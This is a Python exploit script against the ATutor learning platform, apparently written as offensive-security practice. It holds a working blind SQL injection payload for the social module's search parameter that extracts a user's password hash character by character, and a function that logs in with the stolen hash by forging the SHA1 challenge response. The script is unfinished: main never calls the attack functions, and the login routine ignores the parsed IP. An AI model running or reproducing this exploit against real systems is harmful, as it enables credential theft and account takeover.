import requests
import sys
import argparse
import hashlib

def search_friends_sqli(ip, inj_str):
    for j in range(32, 126):
        target = "http://{}/ATutor/mods/_standard/social/index_public.php?q={}".format(ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)

        content_length = int(r.headers.get('Content-Length'))
        if content_length > 20:
            return j

    return None

def inject(r, inj, ip):
    extracted = ""

    for i in range(1, r):
        injection_string = "test'/**/or/**/(ascii(substring(({}),{},1)))=[CHAR]/**/or/**/1='".format(inj, i)
        retrieved_value = search_friends_sqli(ip, injection_string)

        if retrieved_value:
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            print("\n(+) Done!")
            break

    return extracted

def get_user_hash(ip, username='teacher'):
    """
    This will get the has for a target user
    """
    print("(+) Retrieving hash for {}".format(username)) 
    query = "SELECT/**/password/**/FROM/**/AT_members/**/WHERE/**/login/**/=/**/\'{}\'".format(username)
    password = inject(50, query, ip)
    print("(+) Credentials: {} / {}".format(username, password)) 


def gen_hash(passwd, token):
    #Complete
    #hex_sha1(hex_sha1(document.form.form_password.value) + "<?php echo $_SESSION['token']; ?>");
    #password from db is alread hashed so it's really hex_sha1(password_db + $_SESSION['token'])
    m = hashlib.sha1()
    m.update((passwd + token).encode('utf-8'))
    return m.hexdigest()

def we_can_login_with_a_hash(user_hash, username):
    target = "http://{}/ATutor/login.php".format(sys.argv[1])
    token = "hax"
    hashed = gen_hash(user_hash, token)
    print("hashed: {}".format(hashed))

    payload = {
            "form_password_hidden": hashed,
            "form_login": username,
            "submit": "Login",
            "token": token
            }

    s = requests.Session()
    r = s.post(target, data=payload)
    res = r.text
    if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
        return s
    return False


def main():
    parser = argparse.ArgumentParser(description='Exploit ATutor')
    parser.add_argument('--ip', required=True)
    parser.add_argument('-U', '--user', required=True)
    args = parser.parse_args()

    ip = args.ip
    username = args.user
    print('ip: {}; username: {}'.format(ip, username))
    #user_hash = get_user_hash('teacher', ip)

if __name__ == "__main__": 
        main()
